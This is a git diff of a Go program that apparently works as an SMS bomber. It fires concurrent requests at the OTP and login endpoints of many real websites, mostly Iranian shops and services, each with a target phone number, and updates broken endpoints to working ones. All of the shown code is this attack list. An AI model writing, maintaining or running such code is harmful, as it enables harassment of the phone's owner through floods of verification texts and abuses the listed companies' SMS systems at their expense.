@@ -243,33 +243,27 @@ func main() {
 		go sms("https://shahrfarsh.com/Account/Login", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", map[string]interface{}{
-			"phone_email": phone,
-		}, ch)
-		go sms("https://shop.beheshticarpet.com/my-account/", map[string]interface{}{
-			"billing_mobile": phone,
-		}, ch)
-		go sms("https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
+		go sms("https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // add site just login
+		go sms("https://takfarsh.com/wp-admin/admin-ajax.php", map[string]interface{}{
+			"username": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://accounts.khanoumi.com/account/login/init", map[string]interface{}{
+			"loginIdentifier": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.rokla.ir/user/request/otp/", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://rojashop.com/api/auth/sendOtp", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://dadpardaz.com/advice/getLoginConfirmationCode", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://api.rokla.ir/api/request/otp", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://khodro45.com/api/v1/customers/otp/", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
 			"mobileNumber": phone,
-		}, ch)
-		go sms("https://api.pezeshket.com/core/v1/auth/requestCode", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
 			"mobileNumber": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
 			"'method': 'phone', 'identifier'": phone,
 		}, ch)
